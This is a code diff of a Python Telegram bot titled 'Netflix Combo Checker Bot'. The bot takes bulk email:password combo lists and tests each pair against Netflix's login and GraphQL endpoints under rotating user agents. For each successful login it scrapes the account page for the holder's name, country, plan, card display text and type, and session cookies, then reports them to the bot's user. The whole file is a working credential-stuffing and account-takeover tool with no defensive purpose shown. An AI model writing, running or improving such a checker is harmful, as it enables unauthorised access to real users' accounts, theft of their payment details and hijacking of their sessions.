@@ -1,25 +1,24 @@
 import os
 import re
 import uuid
-import asyncio
 import logging
 from datetime import datetime
 
 import requests
 from fake_useragent import UserAgent
-from telegram import Update, BotCommand
+from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
-# Colors for console (optional, for logging)
+# Colors for console logging
 G = "\033[1;32m"
 R = "\033[1;31m"
 C = "\033[1;36m"
 W = "\033[0m"
 
-# Telegram Bot Token - SET THIS IN RAILWAY ENVIRONMENT VARIABLES
+# Telegram Bot Token - Set this in Railway Environment Variables
 TOKEN = os.getenv("TELEGRAM_TOKEN")
 
-# Enable logging
+# Logging setup
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO
@@ -29,7 +28,6 @@ logger = logging.getLogger(__name__)
 class NetflixChecker:
     def __init__(self):
         self.ua = UserAgent()
-        self.session = None
         self.country_codes = {
             "AF": "93", "AL": "355", "DZ": "213", "AR": "54", "AM": "374", "AU": "61",
             "AT": "43", "AZ": "994", "BH": "973", "BD": "880", "BE": "32", "BR": "55",
@@ -40,7 +38,7 @@ class NetflixChecker:
             "NL": "31", "NZ": "64", "NO": "47", "PK": "92", "PH": "63", "PL": "48",
             "PT": "351", "RO": "40", "RU": "7", "SA": "966", "SG": "65", "ZA": "27",
             "ES": "34", "SE": "46", "CH": "41", "TH": "66", "TR": "90", "UA": "380",
-            "AE": "971", "GB": "44", "US": "1", "VN": "84", "PH": "63"  # Philippines
+            "AE": "971", "GB": "44", "US": "1", "VN": "84", "PH": "63"
         }
 
     def get_country_code(self, country: str) -> str:
@@ -48,17 +46,15 @@ class NetflixChecker:
 
     async def check_account(self, email: str, password: str) -> str:
         try:
-            self.session = requests.Session()
-            session = self.session
+            session = requests.Session()
             ua = self.ua.random
 
-            # Get geo location for country
+            # Detect country
             country = "US"
             try:
                 geo_resp = session.get(
                     "https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location",
-                    headers={"User-Agent": ua},
-                    timeout=10
+                    headers={"User-Agent": ua}, timeout=10
                 )
                 if geo_resp.status_code == 200:
                     try:
@@ -72,11 +68,11 @@ class NetflixChecker:
 
             code = self.get_country_code(country)
             login_url = f"https://www.netflix.com/{country.lower()}-en/login"
-            
-            res = session.get(login_url, headers={"User-Agent": ua, "Accept-Encoding": "gzip, deflate"})
+
+            res = session.get(login_url, headers={"User-Agent": ua, "Accept-Encoding": "gzip, deflate"}, timeout=15)
             source = res.text
 
-            # Extract required parameters
+            # Extract parameters
             clcsSessionId = re.search(r'clcsSessionId\\":\\"(.*?)\\"', source)
             clcsSessionId = clcsSessionId.group(1) if clcsSessionId else ""
 
@@ -90,9 +86,7 @@ class NetflixChecker:
             page_uuid = page_uuid_match.group(1) if page_uuid_match else str(uuid.uuid4())
 
             id_param = str(uuid.uuid4()).replace("-", "")
-            uuid_param = str(uuid.uuid4())
 
-            # Login payload
             payload = {
                 "operationName": "CLCSScreenUpdate",
                 "variables": {
@@ -124,100 +118,81 @@ class NetflixChecker:
 
             res_auth = session.post(
                 "https://web.prod.cloud.netflix.com/graphql",
-                json=payload,
-                headers=post_headers,
-                timeout=15
+                json=payload, headers=post_headers, timeout=20
             )
 
-            if "Navigating to /browse" in res_auth.text or "universal\":\"/browse\"" in res_auth.text:
-                # Successful login - get account details
-                url = "https://www.netflix.com/account"
+            if "Navigating to /browse" in res_auth.text or 'universal":"/browse"' in res_auth.text:
+                # Get account details
+                account_url = "https://www.netflix.com/account"
                 headers = {
                     'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
-                    'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-                    'Accept-Encoding': "gzip, deflate, br, zstd",
+                    'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+                    'Accept-Encoding': "gzip, deflate, br",
                     'upgrade-insecure-requests': "1",
-                    'referer': "https://www.netflix.com/unsupported2",
+                    'referer': "https://www.netflix.com/",
                     'accept-language': "en-US,en"
                 }
-                response = session.get(url, headers=headers, timeout=15)
+                response = session.get(account_url, headers=headers, timeout=15)
                 m = response.text
 
                 try:
-                    # Parse account info
-                    local_date = re.search(r'"localDate":"(.*?)"', m)
-                    end = local_date.group(1) if local_date else "N/A"
+                    end = re.search(r'"localDate":"(.*?)"', m)
+                    end = end.group(1) if end else "N/A"
 
-                    cc_match = re.search(r'"growthPaymentMethods":\[{"__typename":"GrowthCardPaymentMethod","displayText":"(.*?)"', m)
-                    cc = cc_match.group(1) if cc_match else "N/A"
+                    cc = re.search(r'displayText":"(.*?)"', m)
+                    cc = cc.group(1) if cc else "N/A"
 
-                    type_cc_match = re.search(r'"paymentOptionLogo":"(.*?)"', m)
-                    type_cc = type_cc_match.group(1) if type_cc_match else "N/A"
+                    type_cc = re.search(r'paymentOptionLogo":"(.*?)"', m)
+                    type_cc = type_cc.group(1) if type_cc else "N/A"
 
-                    info = m.split('"accountInfo":{"data"')[1] if '"accountInfo":{"data"' in m else ""
-                    
-                    co = re.search(r'"country":"(.*?)"', info)
+                    co = re.search(r'"country":"(.*?)"', m)
                     co = co.group(1) if co else country
 
-                    screens = re.search(r'"maxStreams":(\d+)', info)
+                    screens = re.search(r'"maxStreams":(\d+)', m)
                     screens = screens.group(1) if screens else "4"
 
-                    member = re.search(r'"membershipStatus":"(.*?)"', info)
+                    member = re.search(r'"membershipStatus":"(.*?)"', m)
                     member = member.group(1) if member else "CURRENT_MEMBER"
 
-                    name = re.search(r'"firstName":"(.*?)"', info)
+                    name = re.search(r'"firstName":"(.*?)"', m)
                     name = name.group(1).replace('\\x20', ' ') if name else "N/A"
 
                     # Cookies
-                    flwssn = response.cookies.get("flwssn", "")
-                    nfvdid = response.cookies.get("nfvdid", "")
-                    SecureNetflixId = response.cookies.get("SecureNetflixId", "")
-                    NetflixId = response.cookies.get("NetflixId", "")
-                    cookie_str = f"flwssn={flwssn}; nfvdid={nfvdid}; SecureNetflixId={SecureNetflixId}; NetflixId={NetflixId}"
+                    cookies = response.cookies
+                    cookie_str = f"flwssn={cookies.get('flwssn','')}; nfvdid={cookies.get('nfvdid','')}; SecureNetflixId={cookies.get('SecureNetflixId','')}; NetflixId={cookies.get('NetflixId','')}"
 
                     result = f"""✅ <b>SUCCESSFUL LOGIN</b>
 
 📧 <b>Email:</b> <code>{email}</code>
-🔑 <b>Password:</b> <code>{password}</code>
+🔑 <b>Pass:</b> <code>{password}</code>
 🌍 <b>Country:</b> {co}
 📱 <b>Screens:</b> {screens}
-👤 <b>Member:</b> {member}
+👤 <b>Status:</b> {member}
 👤 <b>Name:</b> {name}
 📅 <b>Expire:</b> {end}
 💳 <b>CC:</b> {cc}
-💳 <b>CC Type:</b> {type_cc}
-🍪 <b>Cookies:</b> <code>{cookie_str}</code>"""
+💳 <b>Type:</b> {type_cc}
+🍪 <b>Cookie:</b> <code>{cookie_str[:100]}...</code>"""
 
                     return result
 
-                except Exception as e:
-                    return f"✅ <b>Logged in successfully</b> but error parsing details.\n\nEmail: {email}\nPassword: {password}"
+                except Exception as parse_err:
+                    logger.error(f"Parse error: {parse_err}")
+                    return f"✅ <b>Logged in</b> (details parsing failed)\nEmail: <code>{email}</code>"
+
             else:
-                return f"❌ <b>Bad Login</b>\n\nEmail: <code>{email}</code>\nPassword: <code>{password}</code>"
+                return f"❌ <b>Bad Login</b>\nEmail: <code>{email}</code>\nPass: <code>{password}</code>"
 
         except Exception as e:
-            logger.error(f"Error checking {email}: {str(e)}")
-            return f"⚠️ <b>Error checking account</b>\nEmail: <code>{email}</code>\nError: {str(e)[:200]}"
+            logger.error(f"Check error for {email}: {e}")
+            return f"⚠️ <b>Error</b>\nEmail: <code>{email}</code>\nError: {str(e)[:150]}"
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "👋 <b>Netflix Combo Checker Bot</b>\n\n"
-        "Send combos in format:\n"
+        "Send combos like:\n"
         "<code>email:password</code>\n\n"
-        "You can send multiple lines for bulk checking.\n\n"
-        "Example:\n"
-        "user1@gmail.com:pass123\n"
-        "user2@yahoo.com:mypass456",
-        parse_mode='HTML'
-    )
-
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "📋 <b>How to use:</b>\n\n"
-        "1. Send message with one or more lines of email:password\n"
-        "2. Bot will check each combo against Netflix\n"
-        "3. Results will be sent back\n\n"
-        "Supported: Multiple combos (one per line)",
+        "You can send multiple lines for bulk check.",
         parse_mode='HTML'
     )
 
@@ -226,64 +201,45 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     text = update.message.text.strip()
-    lines = [line.strip() for line in text.split('\n') if line.strip()]
+    lines = [line.strip() for line in text.split('\n') if ':' in line.strip()]
 
     if not lines:
-        await update.message.reply_text("❌ Please send valid email:password combos.")
+        await update.message.reply_text("❌ Send valid email:password combos (one per line).")
         return
 
     checker = NetflixChecker()
     total = len(lines)
-    await update.message.reply_text(f"🔄 Checking <b>{total}</b> account(s)... Please wait.", parse_mode='HTML')
+    await update.message.reply_text(f"🔄 Checking <b>{total}</b> account(s)...", parse_mode='HTML')
 
-    results = []
     for i, line in enumerate(lines, 1):
-        if ':' not in line:
-            results.append(f"❌ Invalid format: {line}")
-            continue
+        try:
+            email, password = [x.strip() for x in line.split(':', 1)]
+            if not email or not password:
+                continue
 
-        email, password = line.split(':', 1)
-        email = email.strip()
-        password = password.strip()
+            status = f"⏳ Checking {i}/{total}: <code>{email}</code>"
+            temp_msg = await update.message.reply_text(status, parse_mode='HTML')
 
-        if not email or not password:
-            results.append(f"❌ Invalid combo: {line}")
-            continue
+            result = await checker.check_account(email, password)
+            await temp_msg.edit_text(result, parse_mode='HTML', disable_web_page_preview=True)
 
-        status_msg = f"⏳ Checking {i}/{total}: <code>{email}</code>"
-        temp_msg = await update.message.reply_text(status_msg, parse_mode='HTML')
+        except Exception as e:
+            logger.error(f"Line error: {e}")
 
-        result = await checker.check_account(email, password)
-        results.append(result)
-
-        await temp_msg.edit_text(result, parse_mode='HTML', disable_web_page_preview=True)
-
-    # Summary
-    success = sum(1 for r in results if "SUCCESSFUL LOGIN" in r or "Logged in successfully" in r)
-    await update.message.reply_text(
-        f"✅ <b>Check Completed!</b>\n\n"
-        f"Total: {total}\n"
-        f"✅ Hits: {success}\n"
-        f"❌ Miss: {total - success}",
-        parse_mode='HTML'
-    )
+    await update.message.reply_text(f"✅ <b>Check Completed!</b>\nTotal: {total}", parse_mode='HTML')
 
 def main():
     if not TOKEN:
-        logger.error("TELEGRAM_TOKEN environment variable not set!")
+        logger.error("TELEGRAM_TOKEN not set in environment variables!")
         return
 
     application = Application.builder().token(TOKEN).build()
 
-    # Commands
     application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("help", help_command))
-
-    # Message handler for combos
     application.add_handler(MessageHandler(filters.TEXT & \~filters.COMMAND, handle_message))
 
-    logger.info("Netflix Checker Bot is running...")
-    application.run_polling()
+    logger.info("🚀 Netflix Checker Bot started successfully!")
+    application.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
     main()
